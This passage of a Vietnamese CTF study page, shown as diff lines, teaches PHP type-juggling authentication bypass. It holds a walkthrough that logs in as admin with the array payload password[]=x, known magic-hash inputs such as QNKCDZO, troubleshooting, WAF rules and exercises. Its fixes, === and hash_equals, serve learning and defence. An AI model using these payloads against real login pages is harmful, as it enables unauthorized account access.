+    <div class="srow"><span class="n">1</span><div><div class="t">Recon</div><div class="d">BTC cấp source PHP. Đọc <code>login.php</code>, thấy dòng <code>if (strcmp($_POST['password'], $admin_pass) == 0)</code>.</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Nhận diện</div><div class="d">Dùng <code>==</code> và gọi <code>strcmp</code> trực tiếp lên input chưa kiểm tra kiểu ⟹ nghi array bypass.</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Khai thác</div><div class="d">Burp Repeater, đổi body thành <code>username=admin&amp;password[]=x</code> → Response: "Welcome, admin!" ⟹ đăng nhập thành công dù không biết mật khẩu.</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">Lấy flag</div><div class="d">Trang admin sau đăng nhập hiện <code>FHACKER2026{...}</code>.</div></div></div>
+    <div class="srow"><span class="n">5</span><div><div class="t">Tự động hóa</div><div class="d">Dùng script (C) mục 08.</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / PHÒNG THỦ — KHÓ CHẶN BẰNG WAF, GIỐNG IDOR</div>
+  <h2>Vì sao bài này cũng khó dùng WAF</h2>
+  <div class="note warn"><span class="tag">Giống IDOR</span>Payload <code>password[]=x</code> hoặc
+  <code>password=QNKCDZO</code> <strong>trông hoàn toàn như request bình thường</strong> — không có ký tự lạ,
+  không có dấu hiệu tấn công rõ ràng để WAF nhận diện qua regex. Đây là lỗi logic thuần trong code so sánh, chỉ
+  sửa được bằng cách đổi <code>==</code> thành <code>===</code> (không thể qua WAF vì A/D cấm sửa source).</div>
+  <table>
+    <tr><th>Cách hạn chế một phần qua WAF</th><th>Hiệu quả</th></tr>
+    <tr><td>Chặn request có param tên trùng kèm <code>[]</code> ở field vốn chỉ nhận chuỗi đơn (vd <code>password[]=</code>)</td><td>Chặn được riêng kỹ thuật array bypass, không chặn được magic hash (trông y hệt password thường)</td></tr>
+    <tr><td>Chặn các input magic hash đã biết công khai (<code>QNKCDZO</code>, <code>240610708</code>...)</td><td>Chỉ chặn được các input ĐÃ BIẾT — đối thủ có thể tự tính magic hash mới (mục 07.C) để né</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LỖI THƯỜNG GẶP & GỠ</div>
+  <h2>Khi payload không ăn</h2>
+  <table>
+    <tr><th>Triệu chứng</th><th>Nguyên nhân</th><th>Cách sửa</th></tr>
+    <tr><td>Array bypass không ăn, báo lỗi 500</td><td>PHP phiên bản mới (≥8) ném <code>TypeError</code> thay vì trả NULL khi gọi <code>strcmp</code> với mảng — code không bắt exception nên crash thay vì bypass</td><td>Không khai thác được qua array bypass ở bản PHP này, thử magic hash hoặc hướng khác</td></tr>
+    <tr><td>Magic hash không ăn dù code dùng <code>==</code></td><td>Code dùng <code>password_hash()</code>/<code>password_verify()</code> (không bị ảnh hưởng type juggling) thay vì MD5/SHA1 thô</td><td>Không phải lỗ hổng ở đây, kiểm tra lại đúng dòng so sánh trong source</td></tr>
+    <tr><td>Không có source để đọc, chỉ đoán mò</td><td>Khó áp dụng chính xác kỹ thuật này nếu không biết hàm hash/kiểu so sánh</td><td>Ưu tiên tìm cách đọc source trước (LFI, `.git` leak, BTC có cấp source không) — khai thác này gần như luôn cần đọc source</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / NHẬN DIỆN & GIỚI HẠN</div>
+  <h2>Khi nào ĐƯỢC / KHÔNG dùng</h2>
+  <table>
+    <tr><th></th><th>Tình huống</th></tr>
+    <tr><td>✅</td><td>Code PHP dùng <code>==</code> (không phải <code>===</code>) để so sánh hash/token/mật khẩu, hoặc gọi <code>strcmp()</code>/<code>md5()</code> trực tiếp lên input chưa ép kiểu.</td></tr>
+    <tr><td>❌</td><td>Code dùng <code>===</code>, hoặc dùng <code>hash_equals()</code> (hàm PHP chuyên dùng để so sánh hash an toàn, chống cả timing attack lẫn type juggling).</td></tr>
+    <tr><td>❌</td><td>Dùng <code>password_hash()</code>/<code>password_verify()</code> — các hàm này không bị ảnh hưởng bởi type juggling.</td></tr>
+    <tr><td>❌</td><td>Ngôn ngữ khác PHP (Python/Node/Java không có quy tắc ép kiểu <code>0e</code> kỳ lạ này) — bài này đặc thù PHP.</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 13 -->
+<section class="block" id="s13">
+ <div class="wrap">
+  <div class="secnum">13 / BÀI TẬP & THUẬT NGỮ</div>
+  <h2>Luyện tập</h2>
+  <p>⭐ <strong>Làm lại:</strong> dựng ví dụ mục 09 bằng tay trên Burp, đọc source giả định, nhận diện
+  <code>strcmp</code>+<code>==</code>, khai thác bằng array bypass.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Nhớ cú pháp chính xác: tên tham số phải có <code>[]</code> ngay sau,
+  không phải thêm khoảng trắng hay ký tự khác.</details>
+
+  <p>⭐⭐ <strong>Đổi 1 biến:</strong> code dùng <code>$hash == $input_hash</code> với MD5, nhưng array bypass bị
+  chặn (code có <code>is_string()</code> check trước). Dùng magic hash để bypass.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Cần biết (hoặc đoán) hash thật trong DB có dạng <code>0e</code>-toàn-số
+  trước — nếu không, thử tất cả input mẫu ở mục 06.A, xem input nào server chấp nhận.</details>
+
+  <p>⭐⭐⭐⭐ <strong>Tự nghĩ:</strong> source dùng <code>in_array($role, ["admin", "moderator"], true)</code> —
+  đã có tham số thứ 3 <code>true</code> (so sánh chặt). Vì sao kỹ thuật type juggling KHÔNG áp dụng được ở đây?
+  Tìm hướng khai thác khác cho đoạn code này.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Tham số thứ 3 <code>true</code> của <code>in_array</code> bắt
+  <code>===</code> (so sánh chặt) — type juggling bị vô hiệu hoàn toàn. Hướng khác: kiểm tra biến <code>$role</code>
+  đến từ đâu, có thể là lỗi Mass Assignment (xem bài riêng) thay vì type juggling.</details>
+
+  <h2>Thuật ngữ</h2>
+  <table>
+    <tr><td>Loose comparison (<code>==</code>)</td><td>So sánh PHP cho phép tự ép kiểu trước khi so, có thể gây kết quả phản trực giác.</td></tr>
+    <tr><td>Strict comparison (<code>===</code>)</td><td>So sánh yêu cầu cả giá trị lẫn kiểu dữ liệu giống hệt, không ép kiểu.</td></tr>
+    <tr><td>Magic hash</td><td>Chuỗi hash tình cờ có dạng số khoa học <code>0e...</code>, khiến mọi magic hash khác "bằng nhau" theo <code>==</code>.</td></tr>
+    <tr><td>Array bypass</td><td>Gửi tham số dạng mảng (<code>param[]=x</code>) để một số hàm chuỗi (như <code>strcmp</code>) trả về giá trị bất thường (NULL) thay vì lỗi dừng chương trình.</td></tr>
+  </table>
+  <p style="margin-top:16px"><strong>Công cụ/tài liệu offline:</strong>
+  <code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/Type Juggling/</code>.</p>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>Chỉ dùng cho học tập &amp; thi CTF hợp pháp, trong phạm vi được cấp phép (F-Hacker 2026 Bảng C và tương tự).</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("juggle-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("juggle-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+})();
+</script>
